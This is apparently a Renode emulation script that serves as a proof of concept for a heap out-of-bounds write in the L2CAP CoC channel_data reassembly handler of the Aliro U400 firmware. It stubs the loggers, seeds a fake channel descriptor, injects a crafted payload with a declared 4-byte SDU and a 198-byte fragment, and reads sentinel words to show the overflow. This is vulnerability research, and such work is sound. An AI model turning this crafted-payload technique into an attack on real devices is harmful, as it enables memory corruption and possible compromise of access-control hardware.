:name: Aliro U400 L2CAP RX dispatch-injection (approach B)
:description: Injects a crafted L2CAP CoC channel_data fragment at the firmware's OWN reassembly
: handler sub_801d96c (the sli_bt_l2cap_transfer channel_data case) on REAL, unmodified firmware
: bytes. No forced PC below the entry: the firmware reads the attacker-declared sdu_size from the
: wire (payload[4..5]=4), computes frag_len UNCLAMPED (data.len-2=198), and calls
: aliro_ble_l2cap_on_data_received (0x805e7b0) which memcpy()s 198 bytes into a buffer whose
: declared SDU size is 4  ->  HEAP OOB WRITE of 194 bytes. This proves the SDK transfer manager does
: NOT clamp offset+len before the copy (its sdu_pointer+frag_len>sdu_size check runs only AFTER
: on_data_received returns).
#
# WHY no full boot: the unmodified firmware wedges in radio/RAIL init (b . @0x808105c after
# sub_80e3d60 fails, because the Renode radio model doesn't drive the RAIL handshake). A b. spin
# is a degenerate CPU state that breaks Step. Instead we load the real flash image, pre-seed the
# joined-device runtime state (same model as the zb0*_dispatch_inject.resc campaign), and stub the
# three debug-log helpers (spin without UART/RTOS; touch NO gate/sink logic), then force-enter the
# real channel_data handler. Every instruction in sub_801d96c + on_data_received + the memcpy is
# real, unmodified firmware code run with NO forced PC below the injection entry.
#
# FORCED (scaffolding, all = modeling an opened Aliro CoC channel on a joined device):
#   - descriptor D @0x20030000 (transfer=D+4) with cid/conn/max_sdu/max_pdu/credit + reassembly
#     buffer B; registered into app array 0x2001b758[0] and SDK RX list *0x20013878.
#   - callback vtable V @0x20033000 (V[1]=on_data_received|thumb) — the .data copy the boot would make.
#   - three loggers stubbed to `bx lr`.
# NATURAL (firmware's own code, no forced PC): find-transfer, first-fragment detection, sdu_size read
#   from the wire, frag_len computation, the unclamped on_data_received call, malloc-skip, guard,
#   and the overflowing memcpy.

using sysbus
emulation SetGlobalSerialExecution true
mach create "mg24"
machine LoadPlatformDescription @platforms/boards/silabs/brd4186c.repl
sysbus LoadELF @/home/chen/matter-renode-work/sl-renode/matter/aliro-u400/firmware/U400_primary_target.elf
sysbus.cpu VectorTableOffset 0x08006000

# --- stub debug loggers (bx lr) : sub_8033598, sub_80336f0, sub_80cae30 ---
sysbus WriteWord 0x8033598 0x4770
sysbus WriteWord 0x80336f0 0x4770
sysbus WriteWord 0x80cae30 0x4770

# --- return trap (b .) ---
sysbus WriteWord 0x2000EE00 0xE7FE

# --- callback vtable V @0x20033000 : V+4 = on_data_received|thumb ---
sysbus WriteDoubleWord 0x20033000 0x00000000
sysbus WriteDoubleWord 0x20033004 0x0805e7b1

# --- transfer descriptor D @0x20030000 (transfer = D+4 = 0x20030004) ---
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_zero.bin 0x20030000
sysbus WriteDoubleWord 0x20030008 0x20033000
sysbus WriteWord       0x2003000c 0x0040
sysbus WriteWord       0x2003000e 0x01F4
sysbus WriteWord       0x20030010 0x00F7
sysbus WriteWord       0x20030018 0x000A
sysbus WriteByte       0x20030028 0x01
sysbus WriteDoubleWord 0x20030038 0x20032000

# --- register descriptor into app array + SDK manager RX list ---
sysbus WriteDoubleWord 0x2001b758 0x20030000
sysbus WriteDoubleWord 0x20013878 0x20030004

# --- crafted channel_data payload + sentinel reassembly buffer ---
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_payload.bin 0x20031000
sysbus LoadBinary @matter/aliro-u400/scenarios/aliro_sentinel.bin 0x20032000

# --- observation hooks ---
sysbus.cpu AddHook 0x801d96c "self.ErrorLog('MARK_RX_HANDLER_ENTRY sub_801d96c (channel_data)')"
sysbus.cpu AddHook 0x805e7b0 "self.ErrorLog('MARK_ON_DATA_RECEIVED  offset={0} len={1} data=0x{2:X}'.format(self.GetRegister(1).RawValue, self.GetRegister(2).RawValue, self.GetRegister(3).RawValue))"
sysbus.cpu AddHook 0x805e838 "self.ErrorLog('MARK_MEMCPY  dest=0x{0:X} src=0x{1:X} len={2}  (buffer declared sdu_size=4)'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
sysbus.cpu AddHook 0x805e83c "self.ErrorLog('MARK_COPY_DONE - just after the overflowing memcpy')"

# --- enter the real channel_data handler sub_801d96c(r0 = &payload) ---
sysbus.cpu SetRegister 0  0x20031000
sysbus.cpu SetRegister 13 0x2003F000
sysbus.cpu SetRegister 14 0x2000EE01
sysbus.cpu PC 0x801d96c

echo ">>> BEFORE reassembly buffer B sentinels (0xA5A5A5A5 = untouched):"
echo ">>>   B+0x04 (first word PAST declared sdu_size=4):"
sysbus ReadDoubleWord 0x20032004
echo ">>>   B+0xC0 (192B in):"
sysbus ReadDoubleWord 0x200320C0

# bounded step: copy completes well within this; no IsHalted (that busy-waits under Step)
sysbus.cpu Step 2500

echo ">>> AFTER:"
echo ">>>   B+0x00 (inside declared 4B SDU, expect 0x41414141):"
sysbus ReadDoubleWord 0x20032000
echo ">>>   B+0x04 (OOB past declared sdu_size=4, expect 0x41414141):"
sysbus ReadDoubleWord 0x20032004
echo ">>>   B+0xC0 (192B, deep OOB, expect 0x41414141):"
sysbus ReadDoubleWord 0x200320C0
echo ">>>   B+0xC8 (200B, just past the 198B copy, expect 0xA5A5A5A5):"
sysbus ReadDoubleWord 0x200320C8
echo ">>>   firmware-set sdu_size D+0x12 (expect 0x0004, read from the wire):"
sysbus ReadWord 0x20030012
echo ">>>   PC (expect 0x805e83c = halted right after the memcpy):"
sysbus.cpu PC
quit
